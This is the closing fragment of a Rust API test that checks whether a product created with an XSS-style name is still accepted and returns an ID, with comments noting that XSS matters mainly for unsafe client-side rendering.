                // The name should be exactly what we sent (or sanitized)
                // Most importantly, this is a JSON API so XSS isn't really a concern
                // unless the client renders it unsafely
                assert!(json.get("id").is_some(), "XSS payload accepted: response should contain product ID to confirm successful creation");
            }
        }
    }
}
